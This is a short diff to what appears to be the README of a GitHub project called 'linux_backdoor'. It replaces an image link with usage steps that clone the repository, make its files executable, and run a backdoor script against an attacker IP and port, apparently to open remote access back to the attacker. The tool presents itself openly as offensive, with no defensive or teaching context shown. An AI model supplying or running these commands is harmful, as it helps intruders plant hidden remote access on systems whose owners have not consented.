@@ -2,9 +2,14 @@
 
 Usage : 
 
-                                             
-![image](https://user-images.githubusercontent.com/115974774/201755589-7d45b597-8ca5-48b9-bfaa-8fdbb6329aca.png)
-
+  git clone https://github.com/KingstonCyberSec/linux_backdoor.git
+  cd linux_backdoor
+  chmod +x *
+  bash backdoor.sh <Attacker IP> <Port>
+  
+Images :
+  
+  
 
 
 
